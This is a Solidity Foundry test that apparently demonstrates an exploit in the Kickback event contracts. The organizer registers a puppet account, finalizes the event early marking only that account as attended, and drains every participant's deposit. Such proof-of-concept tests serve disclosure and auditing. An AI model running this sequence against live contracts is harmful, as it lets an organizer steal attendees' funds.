pragma solidity ^0.5.11;

import "../src/kickback/Deployer.sol";
import "../src/kickback/EthDeployer.sol";
import "../src/kickback/AbstractConference.sol";

// The Foundry cheatcodes this test uses, declared here so it needs no libraries.
interface Vm {
    function prank(address sender) external;
    function deal(address who, uint256 amount) external;
    function computeCreateAddress(address deployer, uint256 nonce) external returns (address);
    function expectRevert(bytes calldata message) external;
}

/// Kickback's own contracts, unchanged. The organizer registers one account they control,
/// then calls finalize before the event happens, marking only that account as attended.
/// It withdraws every deposit, and the three real attendees can withdraw nothing.
contract KickbackAttackTest {
    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    uint256 constant DEPOSIT = 1 ether;
    address payable constant ORGANIZER = address(uint160(0xA11CE));
    address payable constant PUPPET = address(uint160(0xBADB0D));
    address payable constant ALICE = address(uint160(0xA1));
    address payable constant BOB = address(uint160(0xB0B));
    address payable constant CAROL = address(uint160(0xCA401));

    AbstractConference party;

    function setUp() public {
        EthDeployer ethDeployer = new EthDeployer();
        Deployer deployer = new Deployer(address(ethDeployer), address(0), 0, "");
        address expected = vm.computeCreateAddress(address(ethDeployer), 1);

        vm.prank(ORGANIZER);
        deployer.deploy("Meetup", DEPOSIT, 10, 7 days, address(0));
        party = AbstractConference(address(uint160(expected)));
        require(party.owner() == ORGANIZER, "organizer owns the event");

        register(ALICE);
        register(BOB);
        register(CAROL);
        register(PUPPET);
    }

    function register(address payable who) internal {
        vm.deal(who, DEPOSIT);
        vm.prank(who);
        party.register.value(DEPOSIT)();
    }

    function test_organizerTakesEveryDepositByMarkingOnlyTheirOwnAccount() public {
        require(address(party).balance == 4 * DEPOSIT, "four deposits held");

        // Participants are numbered from 1 in registration order; bit (n - 1) marks
        // participant n. The puppet registered fourth, so only bit 3 is set. Nothing
        // checks the time: the event can be "finalized" before it starts.
        uint256[] memory onlyThePuppet = new uint256[](1);
        onlyThePuppet[0] = 1 << 3;
        vm.prank(ORGANIZER);
        party.finalize(onlyThePuppet);

        require(party.ended(), "ended by one call");
        require(party.totalAttended() == 1, "only the puppet attended");
        require(party.isAttended(PUPPET), "puppet marked present");
        require(!party.isAttended(ALICE), "Alice marked absent");

        vm.prank(PUPPET);
        party.withdraw();
        require(PUPPET.balance == 4 * DEPOSIT, "the puppet holds all four deposits");
        require(address(party).balance == 0, "nothing left for anyone else");

        vm.expectRevert("event still active or you did not attend");
        vm.prank(ALICE);
        party.withdraw();
    }
}
